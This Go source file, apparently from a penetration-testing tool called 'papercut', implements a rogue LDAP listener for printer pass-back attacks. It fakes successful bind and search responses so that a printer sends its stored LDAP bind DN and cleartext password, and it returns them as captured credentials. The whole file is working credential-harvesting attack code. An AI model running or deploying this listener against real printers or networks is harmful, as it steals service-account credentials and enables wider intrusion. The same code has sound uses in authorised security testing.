package listener

import (
	"context"
	"fmt"
	"net"
	"time"

	"papercut/internal/output"
)

// LDAPCreds holds captured LDAP bind credentials.
type LDAPCreds struct {
	SourceIP string
	BindDN   string
	Password string
}

// ListenLDAP starts a TCP listener on addr (host:port), waits for one incoming
// LDAP bind request, extracts the bind DN and password, then returns.
// It blocks until a bind is received or the context/timeout expires.
func ListenLDAP(ctx context.Context, addr string, timeout time.Duration, verbose bool) (*LDAPCreds, error) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return nil, fmt.Errorf("listen on %s: %w", addr, err)
	}
	defer ln.Close()

	// Close listener when context is cancelled
	go func() {
		<-ctx.Done()
		ln.Close()
	}()

	// Set accept deadline based on timeout
	if tcpLn, ok := ln.(*net.TCPListener); ok {
		tcpLn.SetDeadline(time.Now().Add(timeout))
	}

	conn, err := ln.Accept()
	if err != nil {
		select {
		case <-ctx.Done():
			return nil, fmt.Errorf("cancelled while waiting for LDAP connection")
		default:
			return nil, fmt.Errorf("accept: %w", err)
		}
	}
	defer conn.Close()

	sourceIP := conn.RemoteAddr().String()
	if host, _, err := net.SplitHostPort(sourceIP); err == nil {
		sourceIP = host
	}

	if verbose {
		output.Info("Connection received from %s", sourceIP)
	}

	conn.SetReadDeadline(time.Now().Add(timeout))

	// Read LDAP messages in a loop. Some printers send a SearchRequest or
	// anonymous BindRequest before the authenticated BindRequest with credentials.
	for {
		buf := make([]byte, 4096)
		n, err := conn.Read(buf)
		if err != nil {
			return nil, fmt.Errorf("read from %s: %w", sourceIP, err)
		}
		// Reset deadline for next message
		conn.SetReadDeadline(time.Now().Add(timeout))

		data := buf[:n]

		// Peek at the message to determine its type before full parsing
		msgID, opTag, peekErr := peekLDAPOp(data)
		if peekErr != nil {
			if verbose {
				output.Info("  Unparseable LDAP message from %s: %v", sourceIP, peekErr)
			}
			continue
		}

		switch opTag {
		case 0x60: // BindRequest
			bindDN, password, _, err := parseLDAPBind(data)
			if err != nil {
				return nil, fmt.Errorf("parse LDAP bind from %s: %w", sourceIP, err)
			}

			// Send BindResponse(success) so the printer doesn't hang/retry
			resp := buildBindResponse(msgID)
			conn.Write(resp)

			// Skip anonymous binds (empty DN) — wait for the real credentials
			if bindDN == "" {
				if verbose {
					output.Info("  Anonymous bind from %s, waiting for credentials...", sourceIP)
				}
				continue
			}

			return &LDAPCreds{
				SourceIP: sourceIP,
				BindDN:   bindDN,
				Password: password,
			}, nil

		case 0x63: // SearchRequest — respond with empty result so client proceeds to bind
			if verbose {
				output.Info("  SearchRequest from %s, sending empty result...", sourceIP)
			}
			resp := buildSearchResultDone(msgID)
			conn.Write(resp)
			continue

		case 0x42: // UnbindRequest — client is disconnecting
			return nil, fmt.Errorf("client %s unbound without sending credentials", sourceIP)

		default:
			if verbose {
				output.Info("  Ignoring LDAP message 0x%02x from %s", opTag, sourceIP)
			}
			continue
		}
	}
}

// peekLDAPOp reads the outer SEQUENCE and message ID from an LDAP message,
// then returns the message ID and the operation tag byte without fully parsing
// the operation body. This lets us dispatch by message type before parsing.
func peekLDAPOp(data []byte) (msgID int, opTag byte, err error) {
	// Outer SEQUENCE
	tag, inner, _, err := readBERElement(data)
	if err != nil {
		return 0, 0, err
	}
	if tag != 0x30 {
		return 0, 0, fmt.Errorf("expected SEQUENCE (0x30), got 0x%02x", tag)
	}

	// Message ID (INTEGER)
	tag, val, rest, err := readBERElement(inner)
	if err != nil {
		return 0, 0, err
	}
	if tag != 0x02 {
		return 0, 0, fmt.Errorf("expected INTEGER for msgID, got 0x%02x", tag)
	}
	msgID = berToInt(val)

	// Operation tag (just the first byte of the next element)
	if len(rest) < 1 {
		return 0, 0, fmt.Errorf("no operation in LDAP message")
	}
	opTag = rest[0]

	return msgID, opTag, nil
}

// parseLDAPBind parses a BER-encoded LDAP Bind Request and extracts the bind DN and password.
//
// Wire format:
//
//	SEQUENCE {                        tag 0x30
//	  INTEGER messageID               tag 0x02
//	  BindRequest [APPLICATION 0] {   tag 0x60
//	    INTEGER version               tag 0x02
//	    OCTET STRING name (DN)        tag 0x04
//	    [CONTEXT 0] password          tag 0x80 (simple auth)
//	  }
//	}
func parseLDAPBind(data []byte) (bindDN, password string, msgID int, err error) {
	// Outer SEQUENCE
	tag, inner, _, err := readBERElement(data)
	if err != nil {
		return "", "", 0, fmt.Errorf("outer sequence: %w", err)
	}
	if tag != 0x30 {
		return "", "", 0, fmt.Errorf("expected SEQUENCE (0x30), got 0x%02x", tag)
	}

	// Message ID (INTEGER)
	tag, val, rest, err := readBERElement(inner)
	if err != nil {
		return "", "", 0, fmt.Errorf("message id: %w", err)
	}
	if tag != 0x02 {
		return "", "", 0, fmt.Errorf("expected INTEGER (0x02) for msgID, got 0x%02x", tag)
	}
	msgID = berToInt(val)

	// BindRequest [APPLICATION 0]
	tag, bindReq, _, err := readBERElement(rest)
	if err != nil {
		return "", "", 0, fmt.Errorf("bind request: %w", err)
	}
	if tag != 0x60 {
		return "", "", 0, fmt.Errorf("expected BindRequest (0x60), got 0x%02x", tag)
	}

	// Version (INTEGER)
	tag, _, rest, err = readBERElement(bindReq)
	if err != nil {
		return "", "", 0, fmt.Errorf("version: %w", err)
	}
	if tag != 0x02 {
		return "", "", 0, fmt.Errorf("expected INTEGER (0x02) for version, got 0x%02x", tag)
	}

	// Bind DN (OCTET STRING)
	tag, val, rest, err = readBERElement(rest)
	if err != nil {
		return "", "", 0, fmt.Errorf("bind dn: %w", err)
	}
	if tag != 0x04 {
		return "", "", 0, fmt.Errorf("expected OCTET STRING (0x04) for DN, got 0x%02x", tag)
	}
	bindDN = string(val)

	// Password [CONTEXT 0] simple auth
	tag, val, _, err = readBERElement(rest)
	if err != nil {
		return "", "", 0, fmt.Errorf("password: %w", err)
	}
	if tag != 0x80 {
		return "", "", 0, fmt.Errorf("expected context tag (0x80) for password, got 0x%02x", tag)
	}
	password = string(val)

	return bindDN, password, msgID, nil
}

// readBERElement reads one BER TLV element from data.
// Returns the tag byte, the value bytes, the remaining bytes after this element, and any error.
func readBERElement(data []byte) (tag byte, value []byte, rest []byte, err error) {
	if len(data) < 2 {
		return 0, nil, nil, fmt.Errorf("data too short (%d bytes)", len(data))
	}

	tag = data[0]
	pos := 1

	// Parse length
	length := 0
	if data[pos]&0x80 == 0 {
		// Short form: length is in the lower 7 bits
		length = int(data[pos])
		pos++
	} else {
		// Long form: lower 7 bits = number of length bytes that follow
		numBytes := int(data[pos] & 0x7f)
		pos++
		if numBytes == 0 || pos+numBytes > len(data) {
			return 0, nil, nil, fmt.Errorf("invalid BER length encoding")
		}
		for i := 0; i < numBytes; i++ {
			length = (length << 8) | int(data[pos])
			pos++
		}
	}

	if pos+length > len(data) {
		return 0, nil, nil, fmt.Errorf("BER element length %d exceeds available data %d", length, len(data)-pos)
	}

	value = data[pos : pos+length]
	rest = data[pos+length:]
	return tag, value, rest, nil
}

// berToInt converts a BER-encoded integer value to a Go int.
func berToInt(data []byte) int {
	result := 0
	for _, b := range data {
		result = (result << 8) | int(b)
	}
	return result
}

// buildBindResponse creates a minimal LDAP BindResponse with resultCode=0 (success).
//
//	SEQUENCE {
//	  INTEGER msgID
//	  BindResponse [APPLICATION 1] {
//	    ENUMERATED resultCode = 0
//	    OCTET STRING matchedDN = ""
//	    OCTET STRING diagnosticMessage = ""
//	  }
//	}
func buildBindResponse(msgID int) []byte {
	// BindResponse contents: ENUMERATED(0), empty OCTET STRING, empty OCTET STRING
	bindRespContent := []byte{
		0x0a, 0x01, 0x00, // ENUMERATED resultCode = 0 (success)
		0x04, 0x00, // OCTET STRING matchedDN = ""
		0x04, 0x00, // OCTET STRING diagnosticMessage = ""
	}

	// BindResponse [APPLICATION 1] = tag 0x61
	bindResp := berWrap(0x61, bindRespContent)

	// Message ID as BER INTEGER
	msgIDBytes := intToBER(msgID)
	msgIDElement := berWrap(0x02, msgIDBytes)

	// Outer SEQUENCE
	inner := append(msgIDElement, bindResp...)
	return berWrap(0x30, inner)
}

// buildSearchResultDone creates an LDAP SearchResultDone with resultCode=0 (success).
// This tells the client the search returned no results and it can proceed (typically to bind).
//
//	SEQUENCE {
//	  INTEGER msgID
//	  SearchResultDone [APPLICATION 5] {   tag 0x65
//	    ENUMERATED resultCode = 0
//	    OCTET STRING matchedDN = ""
//	    OCTET STRING diagnosticMessage = ""
//	  }
//	}
func buildSearchResultDone(msgID int) []byte {
	content := []byte{
		0x0a, 0x01, 0x00, // ENUMERATED resultCode = 0 (success)
		0x04, 0x00, // OCTET STRING matchedDN = ""
		0x04, 0x00, // OCTET STRING diagnosticMessage = ""
	}

	searchDone := berWrap(0x65, content)
	msgIDElement := berWrap(0x02, intToBER(msgID))

	inner := append(msgIDElement, searchDone...)
	return berWrap(0x30, inner)
}

// berWrap wraps content in a BER TLV with the given tag.
func berWrap(tag byte, content []byte) []byte {
	length := len(content)
	var result []byte

	result = append(result, tag)

	if length < 128 {
		result = append(result, byte(length))
	} else if length < 256 {
		result = append(result, 0x81, byte(length))
	} else {
		result = append(result, 0x82, byte(length>>8), byte(length))
	}

	result = append(result, content...)
	return result
}

// intToBER encodes an integer as BER bytes.
func intToBER(n int) []byte {
	if n == 0 {
		return []byte{0}
	}
	var bytes []byte
	for n > 0 {
		bytes = append([]byte{byte(n & 0xff)}, bytes...)
		n >>= 8
	}
	return bytes
}
